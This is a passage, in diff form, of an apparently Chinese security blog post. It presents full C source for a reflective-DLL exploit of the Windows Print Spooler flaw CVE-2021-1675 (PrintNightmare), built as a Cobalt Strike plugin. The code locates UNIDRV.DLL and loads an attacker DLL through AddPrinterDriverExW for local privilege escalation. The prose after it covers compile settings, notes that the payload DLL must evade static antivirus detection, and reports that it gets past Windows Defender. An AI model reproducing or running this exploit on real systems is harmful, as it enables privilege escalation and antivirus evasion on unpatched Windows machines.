+<span class="cp">#include</span> <span class="cpf">&lt;Winspool.h&gt;</span><span class="cp"></span>
+<span class="cp">#include</span> <span class="cpf">&lt;string&gt;</span><span class="cp"></span>
+
+<span class="kt">wchar_t</span><span class="o">*</span> <span class="nf">charTowchar</span><span class="p">(</span><span class="kt">char</span><span class="o">*</span> <span class="n">str</span><span class="p">)</span> <span class="p">{</span>
+    <span class="kt">int</span> <span class="n">iSize</span> <span class="o">=</span> <span class="n">MultiByteToWideChar</span><span class="p">(</span><span class="n">CP_UTF8</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">str</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+    <span class="kt">wchar_t</span><span class="o">*</span> <span class="n">convertStr</span> <span class="o">=</span> <span class="p">(</span><span class="kt">wchar_t</span> <span class="o">*</span><span class="p">)</span><span class="n">malloc</span><span class="p">(</span><span class="n">iSize</span> <span class="o">*</span> <span class="k">sizeof</span><span class="p">(</span><span class="kt">wchar_t</span><span class="p">));</span>
+    <span class="n">MultiByteToWideChar</span><span class="p">(</span><span class="n">CP_UTF8</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">str</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="n">convertStr</span><span class="p">,</span> <span class="n">iSize</span><span class="p">);</span>
+    <span class="k">return</span> <span class="n">convertStr</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="kt">int</span> <span class="nf">fileExists</span><span class="p">(</span><span class="kt">wchar_t</span><span class="o">*</span> <span class="n">file</span><span class="p">)</span> <span class="p">{</span>
+    <span class="n">WIN32_FIND_DATA</span> <span class="n">FindFileData</span><span class="p">;</span>
+    <span class="n">HANDLE</span> <span class="n">handle</span> <span class="o">=</span> <span class="n">FindFirstFileW</span><span class="p">(</span><span class="n">file</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">FindFileData</span><span class="p">);</span>
+    <span class="kt">int</span> <span class="n">found</span> <span class="o">=</span> <span class="n">handle</span> <span class="o">!=</span> <span class="n">INVALID_HANDLE_VALUE</span><span class="p">;</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">found</span><span class="p">)</span> <span class="p">{</span>
+        <span class="n">FindClose</span><span class="p">(</span><span class="n">handle</span><span class="p">);</span>
+    <span class="p">}</span>
+    <span class="k">return</span> <span class="n">found</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="kt">wchar_t</span><span class="o">*</span> <span class="nf">findDLLPath</span><span class="p">()</span> <span class="p">{</span>
+
+    <span class="kt">wchar_t</span> <span class="n">targetDLLPath</span><span class="p">[</span><span class="n">MAX_PATH</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span> <span class="mi">0</span> <span class="p">};</span>
+
+    <span class="n">DWORD</span> <span class="n">dwNeeded</span><span class="p">;</span>
+    <span class="n">LPBYTE</span> <span class="n">lpDriverInfo</span><span class="p">;</span>
+    <span class="n">DWORD</span> <span class="n">dwReturned</span><span class="p">;</span>
+    <span class="n">DRIVER_INFO_2</span><span class="o">*</span> <span class="n">pInfo</span><span class="p">;</span>
+    <span class="n">DWORD</span> <span class="n">i</span><span class="p">;</span>
+
+    <span class="n">EnumPrinterDriversW</span><span class="p">(</span><span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">dwNeeded</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">dwReturned</span><span class="p">);</span>
+
+    <span class="n">lpDriverInfo</span> <span class="o">=</span> <span class="p">(</span><span class="n">LPBYTE</span><span class="p">)</span><span class="n">LocalAlloc</span><span class="p">(</span><span class="n">LPTR</span><span class="p">,</span> <span class="n">dwNeeded</span><span class="p">);</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">lpDriverInfo</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
+        <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+    <span class="p">}</span>
+
+    <span class="n">EnumPrinterDrivers</span><span class="p">(</span><span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="n">lpDriverInfo</span><span class="p">,</span> <span class="n">dwNeeded</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">dwNeeded</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">dwReturned</span><span class="p">);</span>
+
+    <span class="n">pInfo</span> <span class="o">=</span> <span class="p">(</span><span class="n">DRIVER_INFO_2</span><span class="o">*</span><span class="p">)</span><span class="n">lpDriverInfo</span><span class="p">;</span>
+
+    <span class="k">for</span> <span class="p">(</span><span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">dwReturned</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
+
+        <span class="k">if</span> <span class="p">(</span><span class="n">wcsstr</span><span class="p">(</span><span class="n">pInfo</span><span class="o">-&gt;</span><span class="n">pDriverPath</span><span class="p">,</span> <span class="sa">L</span><span class="s">"ntprint.inf_amd64"</span><span class="p">))</span> <span class="p">{</span>
+
+            <span class="kt">wchar_t</span> <span class="n">tempDrive1</span><span class="p">[</span><span class="n">_MAX_DRIVE</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span> <span class="mi">0</span> <span class="p">};</span>
+            <span class="kt">wchar_t</span> <span class="n">tempDirectory1</span><span class="p">[</span><span class="n">_MAX_DIR</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span> <span class="mi">0</span> <span class="p">};</span>
+            <span class="kt">wchar_t</span> <span class="n">tempFileName1</span><span class="p">[</span><span class="n">_MAX_FNAME</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span> <span class="mi">0</span> <span class="p">};</span>
+            <span class="kt">wchar_t</span> <span class="n">tempFileExtension1</span><span class="p">[</span><span class="n">_MAX_EXT</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span> <span class="mi">0</span> <span class="p">};</span>
+
+            <span class="n">_wsplitpath_s</span><span class="p">(</span><span class="n">pInfo</span><span class="o">-&gt;</span><span class="n">pDriverPath</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">tempDrive1</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="n">_MAX_DRIVE</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">tempDirectory1</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="n">_MAX_DIR</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">tempFileName1</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="n">_MAX_FNAME</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">tempFileExtension1</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="n">_MAX_EXT</span><span class="p">);</span>
+
+            <span class="kt">wchar_t</span><span class="o">*</span> <span class="n">targetDLLName</span> <span class="o">=</span> <span class="p">(</span><span class="n">LPWSTR</span><span class="p">)</span><span class="sa">L</span><span class="s">"UNIDRV.DLL"</span><span class="p">;</span>
+
+            <span class="n">wcscat_s</span><span class="p">(</span><span class="n">targetDLLPath</span><span class="p">,</span> <span class="n">MAX_PATH</span><span class="p">,</span> <span class="n">tempDrive1</span><span class="p">);</span>
+            <span class="n">wcscat_s</span><span class="p">(</span><span class="n">targetDLLPath</span><span class="p">,</span> <span class="n">MAX_PATH</span><span class="p">,</span> <span class="n">tempDirectory1</span><span class="p">);</span>
+            <span class="n">wcscat_s</span><span class="p">(</span><span class="n">targetDLLPath</span><span class="p">,</span> <span class="n">MAX_PATH</span><span class="p">,</span> <span class="n">targetDLLName</span><span class="p">);</span>
+
+            <span class="k">if</span> <span class="p">(</span><span class="n">fileExists</span><span class="p">(</span><span class="n">targetDLLPath</span><span class="p">))</span> <span class="p">{</span>
+
+                <span class="n">LocalFree</span><span class="p">(</span><span class="n">lpDriverInfo</span><span class="p">);</span>
+
+                <span class="k">return</span> <span class="n">targetDLLPath</span><span class="p">;</span>
+            <span class="p">}</span>
+
+        <span class="p">}</span>
+
+        <span class="n">pInfo</span><span class="o">++</span><span class="p">;</span>
+    <span class="p">}</span>
+
+    <span class="n">LocalFree</span><span class="p">(</span><span class="n">lpDriverInfo</span><span class="p">);</span>
+
+<span class="p">}</span>
+
+<span class="kt">int</span> <span class="nf">CVE_2021_1675_LPE</span><span class="p">(</span><span class="kt">wchar_t</span><span class="o">*</span> <span class="n">pthDll</span><span class="p">)</span> <span class="p">{</span>
+    <span class="n">printf</span><span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s">[*] CVE-2021-1675 LPE Exploit</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+    <span class="n">printf</span><span class="p">(</span><span class="s">"[*] Modified by: xq17 </span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+    <span class="n">printf</span><span class="p">(</span><span class="s">"[*] Code Reference: Halil Dalabasmaz (@hlldz) </span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+
+    <span class="n">WCHAR</span> <span class="n">payloadPath</span><span class="p">[</span><span class="n">MAX_PATH</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span> <span class="mi">0</span> <span class="p">};</span>
+    <span class="n">WCHAR</span> <span class="n">targetDLLPath</span><span class="p">[</span><span class="n">MAX_PATH</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span> <span class="mi">0</span> <span class="p">};</span>
+
+    <span class="n">wsprintf</span><span class="p">(</span><span class="n">payloadPath</span><span class="p">,</span> <span class="sa">L</span><span class="s">"%s"</span><span class="p">,</span> <span class="n">pthDll</span><span class="p">);</span>
+    <span class="n">wsprintf</span><span class="p">(</span><span class="n">targetDLLPath</span><span class="p">,</span> <span class="sa">L</span><span class="s">"%ls"</span><span class="p">,</span> <span class="n">findDLLPath</span><span class="p">());</span>
+    <span class="n">printf</span><span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s">payloadPath: %ls</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">payloadPath</span><span class="p">);</span>
+    <span class="n">printf</span><span class="p">(</span><span class="s">"targetDLLPath: %ls</span><span class="se">\n\n</span><span class="s">"</span> <span class="p">,</span><span class="n">targetDLLPath</span><span class="p">);</span>
+
+    <span class="n">DRIVER_INFO_2</span> <span class="n">driverInfo</span><span class="p">;</span>
+    <span class="n">driverInfo</span><span class="p">.</span><span class="n">cVersion</span> <span class="o">=</span> <span class="mi">3</span><span class="p">;</span>
+    <span class="n">driverInfo</span><span class="p">.</span><span class="n">pConfigFile</span> <span class="o">=</span> <span class="n">payloadPath</span><span class="p">;</span>
+    <span class="c1">//driverInfo.pDataFile = (LPWSTR)L"C:\\Windows\\System32\\kernel32.dll";</span>
+    <span class="n">driverInfo</span><span class="p">.</span><span class="n">pDataFile</span> <span class="o">=</span> <span class="n">payloadPath</span><span class="p">;</span>
+    <span class="n">driverInfo</span><span class="p">.</span><span class="n">pDriverPath</span> <span class="o">=</span> <span class="n">targetDLLPath</span><span class="p">;</span>
+    <span class="n">driverInfo</span><span class="p">.</span><span class="n">pEnvironment</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
+    <span class="n">driverInfo</span><span class="p">.</span><span class="n">pName</span> <span class="o">=</span> <span class="p">(</span><span class="n">LPWSTR</span><span class="p">)</span><span class="sa">L</span><span class="s">"SunKorean"</span><span class="p">;</span>
+
+    <span class="n">DWORD</span> <span class="n">addPrinter</span> <span class="o">=</span> <span class="n">AddPrinterDriverExW</span><span class="p">(</span><span class="nb">NULL</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="p">(</span><span class="n">PBYTE</span><span class="p">)</span><span class="o">&amp;</span><span class="n">driverInfo</span><span class="p">,</span> <span class="n">APD_COPY_ALL_FILES</span> <span class="o">|</span> <span class="mh">0x10</span> <span class="o">|</span> <span class="mh">0x8000</span><span class="p">);</span>
+    <span class="k">if</span><span class="p">(</span><span class="n">addPrinter</span><span class="p">){</span>
+        <span class="n">printf</span><span class="p">(</span><span class="s">"[*] AddPrinterDriverExW Ok, done!</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+    <span class="p">}</span>
+    <span class="k">else</span> <span class="p">{</span>
+        <span class="n">printf</span><span class="p">(</span><span class="s">"[-] AddPrinterDriverExW Error, failed!</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+    <span class="p">}</span>
+    <span class="n">printf</span><span class="p">(</span><span class="s">"[*] All done. GetLastError: %d</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">GetLastError</span><span class="p">());</span>
+
+    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
+
+
+<span class="n">BOOL</span> <span class="n">WINAPI</span> <span class="nf">DllMain</span><span class="p">(</span><span class="n">HINSTANCE</span> <span class="n">hinstDLL</span><span class="p">,</span> <span class="n">DWORD</span> <span class="n">dwReason</span><span class="p">,</span> <span class="n">LPVOID</span> <span class="n">lpReserved</span><span class="p">)</span>
+<span class="p">{</span>
+    <span class="n">BOOL</span> <span class="n">bReturnValue</span> <span class="o">=</span> <span class="n">TRUE</span><span class="p">;</span>
+    <span class="k">switch</span> <span class="p">(</span><span class="n">dwReason</span><span class="p">)</span>
+    <span class="p">{</span>
+    <span class="k">case</span> <span class="nl">DLL_QUERY_HMODULE</span><span class="p">:</span>
+        <span class="k">if</span> <span class="p">(</span><span class="n">lpReserved</span> <span class="o">!=</span> <span class="nb">NULL</span><span class="p">)</span>
+            <span class="o">*</span><span class="p">(</span><span class="n">HMODULE</span><span class="o">*</span><span class="p">)</span><span class="n">lpReserved</span> <span class="o">=</span> <span class="n">hAppInstance</span><span class="p">;</span>
+    <span class="k">case</span> <span class="nl">DLL_PROCESS_ATTACH</span><span class="p">:</span>
+        <span class="n">hAppInstance</span> <span class="o">=</span> <span class="n">hinstDLL</span><span class="p">;</span>
+        <span class="cm">/* print some output to the operator */</span>
+        <span class="k">if</span> <span class="p">(</span><span class="n">strlen</span><span class="p">((</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="n">lpReserved</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">){</span>
+            <span class="n">CVE_2021_1675_LPE</span><span class="p">(</span><span class="n">charTowchar</span><span class="p">((</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="n">lpReserved</span><span class="p">));</span>
+        <span class="p">}</span>
+        <span class="k">else</span> <span class="p">{</span>
+            <span class="n">printf</span><span class="p">(</span><span class="s">"Error, No Paramter!</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+        <span class="p">}</span>
+        <span class="cm">/* flush STDOUT */</span>
+        <span class="n">fflush</span><span class="p">(</span><span class="n">stdout</span><span class="p">);</span>
+
+        <span class="cm">/* we're done, so let's exit */</span>
+        <span class="n">ExitProcess</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+        <span class="k">break</span><span class="p">;</span>
+    <span class="k">case</span> <span class="nl">DLL_PROCESS_DETACH</span><span class="p">:</span>
+    <span class="k">case</span> <span class="nl">DLL_THREAD_ATTACH</span><span class="p">:</span>
+    <span class="k">case</span> <span class="nl">DLL_THREAD_DETACH</span><span class="p">:</span>
+        <span class="k">break</span><span class="p">;</span>
+    <span class="p">}</span>
+    <span class="k">return</span> <span class="n">bReturnValue</span><span class="p">;</span>
+<span class="p">}</span>
+</pre></div>
+<p>编译之前记得处理下预处理器:</p>
+<pre><code>NDEBUG;ReflectiveDll_EXPORTS;_WINDOWS;_USRDLL;REFLECTIVE_DLL_EXPORTS;REFLECTIVEDLLINJECTION_VIA_LOADREMOTELIBRARYR;REFLECTIVEDLLINJECTION_CUSTOM_DLLMAIN;WIN_X64;%(PreprocessorDefinitions)</code></pre>
+<p>因为这个洞是利用DLL加载来实现LPE的，所以你的利用DLL必须要支持过静态查杀(比较简单)<br/>
+经过测试，能过window server的window defender，但360会拦截spoolsv进程加载未签名的驱动(可疑程序拦截)。</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20210901215729-8bf986f6-0b2c-1.png"/></p>
+<p>项目地址:<br/>
+<a href="https://github.com/mstxq17/CVE-2021-1675_RDL_LPE" target="_blank">https://github.com/mstxq17/CVE-2021-1675_RDL_LPE</a></p>
+<h2 data-content="1" id="3b2b1b3a708d9c756f35cc19a7aeb091">0x6 总结</h2>
+<p>  本文是偏应用实践类型的文章，其中笔者把日常渗透的一个小场景需求作为出发点，通过对比学习DLL的两种注入手段，理解了Cobalt Strike的DLL反射加载原理，接下来通过简单分析学习PrintNightMare漏洞后，用CS的插件实现在内存层面利用漏洞，从而躲避AV查杀，完成提权需求。</p>
+<h2 data-content="1" id="05f27c34a7213f61bd743d820cf1519c">0x7 参考链接</h2>
+<p><a href="https://www.cnblogs.com/lsh123/p/7806811.html" target="_blank">反射Dll注入分析</a><br/>
+<a href="https://www.write-bug.com/article/1961.html" target="_blank">内存加载DLL</a><br/>
+<a href="https://www.cnblogs.com/gd-luojialin/p/11862767.html" target="_blank">PEB及LDR链</a><br/>
+<a href="https://www.cnblogs.com/lsh123/p/7755187.html" target="_blank">重定位表</a><br/>
+<a href="https://bbs.pediy.com/thread-253918.htm" target="_blank">[原创]一篇文章带你了解Dll注入</a><br/>
+<a href="https://bbs.pediy.com/thread-260235.htm" target="_blank">[原创]恶意代码分析之反射型DLL注入</a><br/>
+<a href="https://mp.weixin.qq.com/s/AhumHYAV-_0DrJ47hC25EA" target="_blank">Windows PrintNightmare 漏洞和补丁分析</a><br/>
+<a href="https://paper.seebug.org/1635/" target="_blank">CVE-2021-1675 漏洞及利用分析</a><br/>
+<a href="https://synawk.com/blog/printnightmare-cve-2021-1675" target="_blank">PrintNightmare (CVE-2021-1675) Local Privilege Escalation</a><br/>
+<a href="https://paper.seebug.org/1632/#validatedriverinfo" target="_blank">Windows Print Spooler 服务最新漏洞 CVE-2021-34527 详细分析</a><br/>
+<a href="https://www.bleepingcomputer.com/news/microsoft/new-windows-print-spooler-zero-day-exploitable-via-remote-print-servers/" target="_blank">New Windows print spooler zero day exploitable via remote print servers</a><br/>
+<a href="https://www.ired.team/offensive-security/code-injection-process-injection/reflective-dll-injection" target="_blank">Reflective DLL Injection</a></p>
+</div>
+</div>
